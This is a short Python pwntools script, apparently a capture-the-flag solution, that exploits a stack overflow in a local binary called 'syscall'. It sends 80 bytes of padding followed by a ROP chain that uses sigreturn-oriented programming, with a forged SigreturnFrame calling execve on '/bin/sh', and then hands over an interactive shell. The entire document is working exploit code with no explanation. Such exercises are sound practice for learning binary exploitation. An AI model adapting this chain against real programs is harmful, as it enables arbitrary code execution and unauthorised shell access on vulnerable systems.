#!/usr/bin/python
from pwn import *
context.arch = "amd64"

e = ELF("./syscall")
rop = ROP(e)
# 0x0000000000478566 : pop rax ; pop rdx ; pop rbx ; ret
rop.raw(0x478566)
rop.raw(constants.SYS_rt_sigreturn)
rop.raw(0xdeadbeef)
rop.raw(0xdeadbeef)

# 0x0000000000467205 : syscall ; ret
rop.raw(0x467205)

frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = e.search("/bin/sh").next()
frame.rsi = 0
frame.rdx = 0
# 0x0000000000467205 : syscall ; ret
frame.rip = 0x467205
rop.raw(str(frame))

p = process("./syscall")
p.sendline("A" * 80 + str(rop))
p.interactive()
